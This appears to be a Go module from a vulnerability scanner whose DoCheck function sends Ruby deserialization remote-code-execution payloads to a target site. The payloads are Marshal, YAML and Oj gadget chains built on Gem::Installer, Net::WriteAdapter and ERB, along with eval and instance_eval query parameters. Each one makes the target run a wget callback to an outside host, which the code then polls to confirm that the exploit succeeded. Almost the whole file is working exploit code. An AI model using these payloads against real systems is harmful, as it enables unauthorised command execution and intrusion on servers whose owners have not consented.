package ruby

import (
	"encoding/hex"
	"fmt"
	"github.com/hktalent/scan4all/lib/util"
	"io"
	"log"
	"net/url"
	"strings"
	"sync"
)

/*
https://bishopfox.com/blog
*/
func DoCheck(u string) bool {
	bRst := false
	if oH, err := url.Parse(u); nil == err {
		szU := fmt.Sprintf("%s://%s/", oH.Scheme, oH.Host)
		szId := hex.EncodeToString([]byte(szU))
		aCmd := []string{"wget https://rce.51pwn.com/rceCheck?c=" + szId + "&vulId=%d_"}
		var wg sync.WaitGroup
		for n, c := range aCmd {
			c = fmt.Sprintf(c, n)
			//szC := url.QueryEscape(c)
			aPay := []string{
				"?url=|" + url.QueryEscape(c+"1"),
				"?send_method_name=eval&send_argument=`" + url.QueryEscape(c+"2") + "`",
				"?send_value[]=eval&send_value[]=`" + url.QueryEscape(c+"3") + "`",
				"?public_send_method_name=instance_eval&public_send_argument=`" + url.QueryEscape(c+"4") + "`",
				"?public_send_value[]=instance_eval&public_send_value[]=`" + url.QueryEscape(c+"5") + "`",
				"?base64binary=" + url.QueryEscape(util.Base64Encode(`..{.:.payload[.c.Gem::SpecFetcherc.Gem::InstallerU:.Gem::Requirement[.o:.Gem::Package::TarReader.:.@ioo:.Net::BufferedIO.;.o:#Gem::Package::TarReader::Entry.:
@readi.:.@headerI".aaa.:.ET:.@debug_outputo:.Net::WriteAdapter.:.@socketo:.Gem::RequestSet.:
@setso;..;.m.Kernel:.@method_id:.system:
@git_setI".`+c+`6.;
T;.:.resolve`)),
				"?base64binary=" + url.QueryEscape(util.Base64Encode(`..U:,ActiveRecord::Associations::Association[.o:.Gem::Installer.o:.Gem::Package::TarReader.:.@ioo:.Net::BufferedIO.;.o:#Gem::Package::TarReader::Entry.:
@readi.:.@headerI"	bbbb.:.ET:.@debug_outputo:.Logger.:.@logdevo:.Rack::Response.:.@bufferedF:
@bodyo:.Set.:
@hash}.o:.Gem::Security::Policy.:
@name{	:
filenameI"./tmp/xyz.txt.;
T:.environmento:&Rails::Initializable::Initializer.:
@contexto:.Sprockets::Context.:	dataI"A<%= system('`+c+`7') %>.;
T:
metadata{.TF:.@writero:.Sprockets::ERBProcessor.`)),
			}
			for _, x1 := range aPay {
				wg.Add(1)
				go func(s string) {
					defer wg.Done()
					if resp, err := util.DoGet(s, map[string]string{}); nil == err && nil != resp {

					}
				}(szU + x1)
			}

			var aPost = []string{`:payload:
- !ruby/class 'Gem::SpecFetcher'
- !ruby/class 'Gem::Installer'
- !ruby/object:Gem::Requirement
  requirements: !ruby/object:Gem::Package::TarReader
    io: !ruby/object:Net::BufferedIO
      io: !ruby/object:Gem::Package::TarReader::Entry
        read: 0
        header: aaa
      debug_output: !ruby/object:Net::WriteAdapter
        socket: !ruby/object:Gem::RequestSet
          sets: !ruby/object:Net::WriteAdapter
            socket: !ruby/module 'Kernel'
            method_id: :system
          git_set: ` + c + `8
        method_id: :resolve`,
				`---
:payload:
- !ruby/object:Gem::SpecFetcher {}
- !ruby/object:Gem::Installer {}
- ? !ruby/object:Gem::Requirement
    requirements: !ruby/object:Gem::Package::TarReader
      io: !ruby/object:Net::BufferedIO
        io: !ruby/object:Gem::Package::TarReader::Entry
          read: 2
          header: bbbb
        debug_output: !ruby/object:Logger
          logdev: !ruby/object:Rack::Response
            buffered: false
            body: !ruby/object:Set
              hash:
                ? !ruby/object:Gem::Security::Policy
                  name:
                    :filename: "/tmp/xyz.txt"
                    :environment: !ruby/object:Rails::Initializable::Initializer
                      context: !ruby/object:Sprockets::Context {}
                    :data: "<%= os_command = '` + c + `9'; system(os_command); %>"
                    :metadata: {}
                : true
            writer: !ruby/object:Sprockets::ERBProcessor {}
  : dummy_value`,
			}
			// Content-Type: application/json
			var m1 = map[string]interface{}{}
			for i, w := range aPost {
				m1["yaml"] = w
				if data, err := util.Json.Marshal(&m1); nil == err {
					aPost[i] = string(data)
				}
			}
			aPost = append(aPost, `[{"^c":"Gem::SpecFetcher"},{"^c":"Gem::Installer"},{"^o":"Gem::Requirement","requirements":{"^o":"Gem::Package::TarReader","io":{"^o":"Net::BufferedIO","io":{"^o":"Gem::Package::TarReader::Entry","read":0,"header":"aaa"},"debug_output":{"^o":"Net::WriteAdapter","socket":{"^o":"Gem::RequestSet","sets":{"^o":"Net::WriteAdapter","socket":{"^c":"Kernel"},"method_id":":system"},"git_set":"`+c+`10"},"method_id":":resolve"}}}}]`)

			// oj
			aPost = []string{`{
  "^#1": [
    [
      {
        "^c": "Gem::SpecFetcher"
      },
      {
        "^c": "Gem::Installer"
      },
      {
        "^o": "Gem::Requirement",
        "requirements": {
          "^o": "Gem::Package::TarReader",
          "io": {
            "^o": "Net::BufferedIO",
            "io": {
              "^o": "Gem::Package::TarReader::Entry",
              "read": 0,
              "header": "aaa"
            },
            "debug_output": {
              "^o": "Net::WriteAdapter",
              "socket": {
                "^o": "Gem::RequestSet",
                "sets": {
                  "^o": "Net::WriteAdapter",
                  "socket": {
                    "^c": "Kernel"
                  },
                  "method_id": ":system"
                },
                "git_set": "` + c + `11"
              },
              "method_id": ":resolve"
            }
          }
        }
      }
    ],
    "dummy_value"
  ]
}`, `{
  "^#1": [
    [
      {
        "^c": "Gem::SpecFetcher"
      },
      {
        "^o": "Gem::Installer"
      },
      {
        "^o": "Gem::Requirement",
        "requirements": {
          "^o": "Gem::Package::TarReader",
          "io": {
            "^o": "Net::BufferedIO",
            "io": {
              "^o": "Gem::Package::TarReader::Entry",
              "read": 2,
              "header": "bbbb"
            },
            "debug_output": {
              "^o": "Logger",
              "logdev": {
                "^o": "Rack::Response",
                "buffered": false,
                "body": {
                  "^o": "Set",
                  "hash": {
                    "^#2": [
                      {
                        "^o": "Gem::Security::Policy",
                        "name": {
                          ":filename": "/tmp/xyz.txt",
                          ":environment": {
                            "^o": "Rails::Initializable::Initializer",
                            "context": {
                              "^o": "Sprockets::Context"
                            }
                          },
                          ":data": "<%= system('` + c + `12') %>",
                          ":metadata": {}
                        }
                      },
                      true
                    ]
                  }
                },
                "writer": {
                  "^o": "Sprockets::ERBProcessor"
                }
              }
            }
          }
        }
      }
    ],
    "dummy_value"
  ]
}`}
			delete(m1, "yaml")
			for _, w := range aPost {
				// dummy_value 是尝试注入的输入字段
				m1["oj"] = w
				if data, err := util.Json.Marshal(&m1); nil == err {
					aPost = append(aPost, string(data))
				}
			}
			for _, x := range aPost {
				wg.Add(1)
				go func(s string) {
					defer wg.Done()
					if resp, err := util.DoPost(szU, map[string]string{"Content-Type": "application/json"}, strings.NewReader(s)); nil == err && nil != resp {
					}
				}(x)
			}
		}
		// 检测、确认结果
		wg.Wait()
		if resp, err := util.DoGet("https://rce.51pwn.com/rceCheck?q="+szId, map[string]string{}); nil == err && nil != resp {
			var a = []map[string]string{}
			if data, err := io.ReadAll(resp.Body); nil == err {
				if nil == util.Json.Unmarshal(data, &a) {
					if 0 < len(a) {
						log.Printf("fond vuls ruby %v\n", a)
						bRst = true
					}
				}
			}
		}
	} else {
		log.Println(u, err)
	}
	return bRst
}
